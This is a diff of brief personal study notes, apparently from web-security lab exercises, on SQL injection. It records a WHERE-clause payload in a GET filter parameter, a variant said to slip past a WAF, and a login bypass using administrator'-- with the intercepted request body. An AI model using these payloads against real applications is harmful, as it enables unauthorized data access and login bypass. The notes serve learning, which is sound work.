@@ -9,7 +9,7 @@ Commands in SQL:
     
     
 1. Where clause in http get method. 
-2. 
+2. Bypass login username, password doesn't matter. Where clause again.
 
 
 
@@ -32,3 +32,10 @@ it was a firewall.
 Solutions:
 '+OR+1=1--   WAF would block
 filter?category=Clothing%2c+shoes+and+accessories' or category = 'Pets' or category = 'Lifestyle' or category = 'Accessories'--    WAF likely no block
+
+2. 
+Typed into gui administrator'--
+Need to increase burp skills 
+csrf=WdhkXnM3RCCBUnPOw4jLxb1qGaAT4mZn&username=administrator%27--&password=1111111
+' to hex is 27
+Learned intercept to hack from their and the GUI
